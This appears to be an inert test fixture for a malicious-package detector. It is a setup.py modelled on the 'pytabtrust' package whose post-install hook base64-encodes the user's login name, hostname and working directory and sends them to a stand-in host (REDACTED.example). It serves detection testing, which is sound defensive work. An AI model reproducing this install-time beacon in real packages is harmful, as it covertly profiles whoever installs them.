# INERT FIXTURE — never executed. Modeled on `pytabtrust` 9999999.1.1 (2023-05-29,
# DataDog/malicious-software-packages-dataset).
#
# Shape: install-time beacon that exfiltrates WHO AND WHERE — login name, host
# name, working directory — base64'd into a GET query string. It reads no
# environment variable at all, so the pre-existing "network AND env-harvest"
# AND-gate never closes: this is identity recon, not secret harvest.
#
# Redaction: the original callback host is replaced with REDACTED.example.
import base64
import os
from urllib.request import urlopen

from setuptools import setup
from setuptools.command.install import install


def beacon():
    try:
        urlopen(
            "https://REDACTED.example?q="
            + str(base64.urlsafe_b64encode(os.getlogin().encode("utf-8")))
            + "&q2="
            + str(base64.urlsafe_b64encode(os.uname()[1].encode("utf-8")))
            + "&q3="
            + str(base64.urlsafe_b64encode(os.getcwd().encode("utf-8")))
        ).read()
    except Exception:
        pass


class PostInstallCommand(install):
    def run(self):
        install.run(self)
        beacon()


setup(
    name="pytabtrust",
    version="9999999.1.1",
    description="Test",
    cmdclass={"install": PostInstallCommand},
)
